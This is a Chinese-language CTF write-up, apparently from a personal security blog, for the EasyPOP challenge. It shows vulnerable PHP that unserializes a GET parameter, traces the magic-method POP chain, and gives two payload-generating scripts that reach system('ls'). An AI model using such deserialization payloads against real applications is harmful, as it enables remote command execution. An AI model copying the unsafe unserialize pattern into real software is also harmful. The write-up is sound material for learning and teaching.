{"title":"DASCTF X GFCTF 2022十月挑战赛","uid":"0a5f9ba95c642a008814712ab15f1814","slug":"2022DASCTF X GFCTF十月挑战赛-wp","date":"2023-02-13T15:19:34.978Z","updated":"2023-10-13T07:29:37.131Z","comments":true,"path":"api/articles/2022DASCTF X GFCTF十月挑战赛-wp.json","keywords":null,"cover":"/img/37.jpg","content":"<p><code>有水平的</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"DASCTF-X-GFCTF-2022十月挑战赛\"><a href=\"#DASCTF-X-GFCTF-2022十月挑战赛\" class=\"headerlink\" title=\"DASCTF X GFCTF 2022十月挑战赛\"></a>DASCTF X GFCTF 2022十月挑战赛</h1><h2 id=\"1-EasyPOP\"><a href=\"#1-EasyPOP\" class=\"headerlink\" title=\"1.EasyPOP\"></a>1.EasyPOP</h2><p>一道构造<code>pop</code>链的题，拿来练习一下分析能力</p>\n<p>做反序列构造<code>pop</code>链最重要还是要会联想，从而触发方法</p>\n<pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);\n<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fine</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$cmd</span>;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$cmd</span>, <span class=\"variable\">$content</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->cmd = <span class=\"variable\">$cmd</span>;\n        <span class=\"variable language_\">$this</span>->content = <span class=\"variable\">$content</span>;\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>->cmd, <span class=\"variable\">$this</span>->content);\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->cmd = <span class=\"string\">\"\"</span>;\n        <span class=\"keyword\">die</span>(<span class=\"string\">\"Go listen to Jay Chou&#x27;s secret-code! Really nice\"</span>);\n    &#125;\n&#125;\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">show</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$ctf</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$time</span> = <span class=\"string\">\"Two and a half years\"</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$ctf</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->ctf = <span class=\"variable\">$ctf</span>;\n    &#125;\n\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>->ctf-><span class=\"title function_ invoke__\">show</span>();\n <span class=\"comment\">//show类有this->ctf->show() 联想一下__call函数，或者看看其他类有show函数没，在secret_code类中发现有show函数，而其函数内语句会触发__get魔术，而__get魔术会触发fine类的__invoke魔术，其中的call_user_func就是实现反序列化命令执行的关键，所以这里并不触发__call魔术</span>\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>): <span class=\"title\">string</span></span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>->ctf . <span class=\"string\">\": Duration of practice: \"</span> . <span class=\"variable language_\">$this</span>->time;\n    &#125;\n\n\n&#125;\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sorry</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$name</span>;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$hint</span> = <span class=\"string\">\"hint is depend on you\"</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$key</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$password</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->name = <span class=\"variable\">$name</span>;\n        <span class=\"variable language_\">$this</span>->password = <span class=\"variable\">$password</span>;\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->hint = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">secret_code</span>();\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable\">$name</span> = <span class=\"variable language_\">$this</span>->key;\n        <span class=\"variable\">$name</span>();\n<span class=\"comment\">//sorry类的__get函数有$name()，联想到__invoke，fine类的__invoke 函数有call_user_func函数，也就是突破口</span>\n    &#125;\n\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>->password == <span class=\"variable language_\">$this</span>->name) &#123;\n    <span class=\"comment\">//这里的password和name就需要外部实例化后赋值为相同的，因为这样才能通过下面语句调用魔术方法，而不执行else语句</span>\n            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>->hint;\n        <span class=\"comment\">//sorry的析构函数有echo $this->hint 联想一下__toString函数，在Show类中</span>\n        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>->name = <span class=\"string\">\"jay\"</span>) &#123;\n            secret_code::<span class=\"title function_ invoke__\">secret</span>();\n        &#125; <span class=\"keyword\">else</span> &#123;\n            <span class=\"keyword\">echo</span> <span class=\"string\">\"This is our code\"</span>;\n        &#125;\n    &#125;\n\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getPassword</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>->password;\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setPassword</span>(<span class=\"params\"><span class=\"variable\">$password</span></span>): <span class=\"title\">void</span></span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->password = <span class=\"variable\">$password</span>;\n    &#125;\n\n\n&#125;\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">secret_code</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">protected</span> <span class=\"variable\">$code</span>;\n\n    <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">secret</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">include_once</span> <span class=\"string\">\"hint.php\"</span>;\n        <span class=\"title function_ invoke__\">hint</span>();\n    &#125;\n\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$arguments</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable\">$num</span> = <span class=\"variable\">$name</span>;\n        <span class=\"variable language_\">$this</span>-><span class=\"variable\">$num</span>();\n    &#125;\n\n    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span>(<span class=\"params\"></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>->code->secret;  \n<span class=\"comment\">//secret_code类的show函数有this->code->secret，secret属性是所有类都没有的，自然联想到__get，在Sorry类里</span>\n    &#125;\n&#125;\n\n\n<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pop&#x27;</span>])) &#123;\n    <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pop&#x27;</span>]);\n    <span class=\"variable\">$a</span>-><span class=\"title function_ invoke__\">setPassword</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>()));\n&#125; <span class=\"keyword\">else</span> &#123;\n    <span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">show</span>(<span class=\"string\">\"Ctfer\"</span>);\n    <span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>-><span class=\"title function_ invoke__\">show</span>();\n&#125;</code></pre>\n\n\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>pop链的构造</p>\n<p>切入口 sorry类的析构函数，<strong>突破口fine类的__invoke函数中的call_user_func函数</strong></p>\n<p><code>sorry.__destruct -&gt; show.__toString</code><br><code>-&gt;</code><br><code>secret.show()</code><br><code>-&gt;</code><br><code>sorry.__get() -&gt; fine.__invoke()</code><br><code>-&gt;</code><br><code>call_user_func函数</code></p>\n<p>#call_user_func(a,b) — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数<br>#也就是把a当作函数，把b当作传入a函数的参数【如call_user_func(assert,phpinfo()),就会执行代码phpinfo()】</p></blockquote>\n<p>所以<code>payload</code>为</p>\n<pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fine</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$cmd</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$content</span>;\n&#125;\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">show</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$ctf</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$time</span> = <span class=\"string\">\"Two and a half years\"</span>;\n&#125;\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sorry</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$hint</span> = <span class=\"string\">\"hint is depend on you\"</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$key</span>;\n&#125;\n\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">secret_code</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$code</span>;\n&#125;\n<span class=\"variable\">$Fine</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">fine</span>();\n<span class=\"variable\">$Show</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">show</span>();\n<span class=\"variable\">$Sorry</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">sorry</span>();\n<span class=\"variable\">$Sorry2</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">sorry</span>();\n<span class=\"comment\">//这里实例化两次sorry是因为当，脚本运行完毕后，会执行__destruct()魔术方法，从而清空了变量引用，也就相当于关闭了这个类，</span>\n<span class=\"comment\">//但是后续还需要调用其中的魔术方法，所以需要再次实例化，并重新为password和name相同赋值</span>\n<span class=\"variable\">$Secret</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">secret_code</span>();\n\n<span class=\"variable\">$Sorry</span>->name = <span class=\"string\">&#x27;cc&#x27;</span>;\n<span class=\"variable\">$Sorry</span>->password = <span class=\"string\">&#x27;cc&#x27;</span>;\n<span class=\"variable\">$Sorry</span>->hint = <span class=\"variable\">$Show</span>;\n<span class=\"variable\">$Show</span>->ctf = <span class=\"variable\">$Secret</span>;\n<span class=\"variable\">$Secret</span>->code = <span class=\"variable\">$Sorry2</span>;\n\n<span class=\"variable\">$Sorry2</span>->name = <span class=\"string\">&#x27;cc&#x27;</span>;\n<span class=\"variable\">$Sorry2</span>->password = <span class=\"string\">&#x27;cc&#x27;</span>;\n<span class=\"variable\">$Sorry2</span>->key = <span class=\"variable\">$Fine</span>;\n<span class=\"variable\">$Fine</span>->cmd = <span class=\"string\">&#x27;system&#x27;</span>;\n<span class=\"variable\">$Fine</span>->content = <span class=\"string\">&#x27;ls /&#x27;</span>;\n<span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$Sorry</span>);\n<span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>\n<span class=\"meta\">?></span></code></pre>\n\n\n\n<p><strong>补充</strong>：另一种写法，一定要<code>url</code>编码，因为里边有不可见字符。</p>\n<pre class=\" language-highlight php\"><span class=\"meta\"><code class=\"language-highlight php\"><span class=\"meta\"><?php</span>\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">fine</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$cmd</span>;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$content</span>;\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$cmd</span>, <span class=\"variable\">$content</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->cmd = <span class=\"variable\">$cmd</span>;\n        <span class=\"variable language_\">$this</span>->content = <span class=\"variable\">$content</span>;\n    &#125;\n&#125;\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">show</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$ctf</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$time</span> = <span class=\"string\">\"Two and a half years\"</span>;\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$ctf</span>, <span class=\"variable\">$time</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->ctf = <span class=\"variable\">$ctf</span>;\n        <span class=\"variable language_\">$this</span>->time = <span class=\"variable\">$time</span>;\n    &#125;\n&#125;\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">sorry</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$name</span>;\n    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$hint</span> = <span class=\"string\">\"hint is depend on you\"</span>;\n    <span class=\"keyword\">public</span> <span class=\"variable\">$key</span>;\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$password</span>,<span class=\"variable\">$hint</span>,<span class=\"variable\">$key</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->name = <span class=\"variable\">$name</span>;\n        <span class=\"variable language_\">$this</span>->password = <span class=\"variable\">$password</span>;\n        <span class=\"variable language_\">$this</span>->hint  = <span class=\"variable\">$hint</span>;\n        <span class=\"variable language_\">$this</span>->key = <span class=\"variable\">$key</span>;\n    &#125;\n&#125;\n<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">secret_code</span></span>\n<span class=\"class\"></span>&#123;\n    <span class=\"keyword\">protected</span> <span class=\"variable\">$code</span>;\n    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$code</span></span>)</span>\n<span class=\"function\">    </span>&#123;\n        <span class=\"variable language_\">$this</span>->code = <span class=\"variable\">$code</span>;\n    &#125;\n&#125;\n<span class=\"variable\">$Sorry</span>= <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">sorry</span>(<span class=\"string\">&#x27;cc&#x27;</span>,<span class=\"string\">&#x27;cc&#x27;</span>,<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">show</span>(<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">secret_code</span>(<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">sorry</span>(<span class=\"string\">&#x27;cc&#x27;</span>,<span class=\"string\">&#x27;cc&#x27;</span>,<span class=\"string\">&#x27;cc&#x27;</span>,<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">fine</span>(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"string\">&#x27;ls&#x27;</span>))),<span class=\"string\">&#x27;cc&#x27;</span>),<span class=\"string\">&#x27;cc&#x27;</span>);\n\n<span class=\"comment\">//因为这里没有修改变量修饰，</span>\n<span class=\"comment\">//对于private修饰变量无法直接传参，需要实例化类xx(a,b)，然后才能成功传参，当然public类也可以用这种方法传参，只是没必要，但这里是用了的</span>\n<span class=\"comment\">//比如sorry类中name和password变量赋值为cc后，后面实例化的show类就是赋值给public hint变量，是按变量声明顺序来进行赋值的</span>\n<span class=\"comment\">//这里的嵌套就是同上面的payload一样，只是把变量赋值为实例化的类，实例化类的里面再嵌入变量值和其他实例化的类</span>\n\n<span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$Sorry</span>);\n<span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"variable\">$c</span>);\n<span class=\"meta\">?></span></code></pre>\n","text":"有水平的 DASCTF X GFCTF 2022十月挑战赛1.EasyPOP一道构造pop链的题，拿来练习一下分析能力 做反序列构造pop链最重要还是要会联想，...","permalink":"/post/2022DASCTF X GFCTF十月挑战赛-wp","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B\"><span class=\"toc-text\">DASCTF X GFCTF 2022十月挑战赛</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-EasyPOP\"><span class=\"toc-text\">1.EasyPOP</span></a></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"2022RCTF","uid":"5989226e724dd04d4cb9a6777f53450e","slug":"2022RCTF","date":"2023-02-13T15:21:49.888Z","updated":"2023-08-06T08:02:03.811Z","comments":true,"path":"api/articles/2022RCTF.json","keywords":null,"cover":"/img/41.jpg","text":"学到很多 RCTF2022easyupload 附件 https://adworld.xctf.org.cn/media/file/task/0e2ca001-...","permalink":"/post/2022RCTF","photos":[],"count_time":{"symbolsCount":"38k","symbolsTime":"34 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Sekai CTF 2022","uid":"ba0cf5d51c9ce53698d64b464314f97e","slug":"2022SekaiCTF","date":"2023-02-13T15:13:06.374Z","updated":"2023-08-06T08:02:12.273Z","comments":true,"path":"api/articles/2022SekaiCTF.json","keywords":null,"cover":"/img/42.jpg","text":"国外比赛难度确实逆天 Sekai CTF 2022https://github.com/project-sekai-ctf/sekaictf-2022 这是官方...","permalink":"/post/2022SekaiCTF","photos":[],"count_time":{"symbolsCount":"8.7k","symbolsTime":"8 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}